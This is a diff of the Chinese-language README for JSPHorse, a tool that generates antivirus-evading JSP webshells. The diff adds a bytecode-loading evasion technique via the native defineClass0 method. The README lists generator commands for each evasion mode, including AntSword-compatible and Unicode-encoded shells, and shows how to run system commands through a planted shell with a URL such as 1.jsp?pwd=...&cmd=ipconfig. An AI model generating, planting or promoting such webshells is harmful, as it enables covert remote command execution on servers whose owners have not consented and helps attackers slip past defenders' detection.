@@ -30,6 +30,7 @@
 - ScriptEngine调用JS免杀
 - Javac动态编译class免杀
 - java.beans.Expression免杀
+- native方法defineClass0加载字节码免杀
 
 代码生成方式：
 
@@ -52,33 +53,41 @@
 
 在Github右侧Release页面下载
 
-生成标准形式基础Webshell
+- 生成标准形式基础Webshell
 
 `java -jar JSPHorse.jar -p your_password`
 
-生成蚁剑的免杀Webshell
+- 生成蚁剑的免杀Webshell
 
 `java -jar JSPHorse.jar -p your_password --ant`
 
-生成Javac动态编译class的Webshell
+- 生成Javac动态编译class的Webshell
 
 `java -jar JSPHorse.jar -p your_password --javac`
 
-使用ScriptEngine调用JS免杀
+- 使用ScriptEngine调用JS免杀
 
 `java -jar JSPHorse.jar -p your_password --js`
 
-使用Expression免杀
+- 使用Expression免杀
 
 `java -jar JSPHorse.jar -p your_password --expr`
 
-任何一种方式加入`-u`参数进行Unicode编码（有时候有奇效）
+- 使用native方法加载字节码
+
+注意：原理是JVM中注册类，不允许重复，所以这种马只能执行一次命令然后失效。但`JSPHorse`从字节码层面构造不同的类，如果想要多次执行只要重复生成多个马即可
+
+`java -jar JSPHorse.jar -p your_password --proxy`
+
+- 任何一种方式加入`-u`参数进行Unicode编码（有时候有奇效）
 
 `java -jar JSPHorse.jar -p your_password --expr -u`
 
-如何使用？
+- 如何使用
 
-`1.jsp?pwd=your_password&cmd=ipconfig`
+1. 普通情况：`1.jsp?pwd=your_password&cmd=ipconfig`
+
+2. 蚁剑：正常使用
 
 ## 图片
 
